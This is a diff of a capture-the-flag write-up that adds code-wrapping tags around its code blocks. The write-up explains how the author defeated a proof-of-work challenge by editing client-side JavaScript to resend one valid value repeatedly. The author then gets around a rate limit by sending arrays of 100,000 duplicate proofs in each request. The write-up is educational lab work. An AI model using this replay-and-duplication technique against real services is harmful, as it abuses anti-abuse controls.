@@ -32,6 +32,7 @@ Our session is tracked via a cookie: `pow_session`. The local storage contains `
 
 ## Source
 
+{% code overflow="wrap" %}
 ```js
 function hash(input) {
     let result = input;
@@ -72,6 +73,7 @@ async function main() {
 }
 main();
 ```
+{% endcode %}
 
 -   The script reads the PoW progress (int) from local storage (`i`)
 -   It loops 1000 times, incrementing `i` and sending the value to a `hash` function
@@ -92,6 +94,7 @@ Now, if we reload the page, we can modify the JavaScript.
 
 I found a valid value, e.g., `2862152`, and modified the script to repeatedly send it, skipping the hashing algorithm altogether.
 
+{% code overflow="wrap" %}
 ```js
 document.getElementById(
     "client-status"
@@ -102,6 +105,7 @@ for (let j = 0; j < 1000; j++) {
     await send(["2862152".toString()]);
 }
 ```
+{% endcode %}
 
 The progress increments at 1 per second; however, we quickly hit a rate limit.
 
@@ -115,12 +119,15 @@ I quickly realised that the valid PoW's are sent as an array.
 
 I decided to send two valid values at once, e.g.
 
+{% code overflow="wrap" %}
 ```json
 ["2862152", "2862152"]
 ```
+{% endcode %}
 
 This increments the counter by 2! So we just need to make an array of 1 million 🧠
 
+{% code overflow="wrap" %}
 ```js
 var box = [];
 for (let cat = 0; cat < 1000000; cat++) {
@@ -128,11 +135,13 @@ for (let cat = 0; cat < 1000000; cat++) {
 }
 console.log(box.toString());
 ```
+{% endcode %}
 
 Actually, don't do that unless you want to crash your browser 😂
 
 Instead, let's do it 100,000 times, and then we can send 10 requests.
 
+{% code overflow="wrap" %}
 ```js
 var box = [];
 for (let cat = 0; cat < 100000; cat++) {
@@ -140,6 +149,7 @@ for (let cat = 0; cat < 100000; cat++) {
 }
 console.log(box.toString());
 ```
+{% endcode %}
 
 It's works! We repeat 10 times and get the flag 😌
 
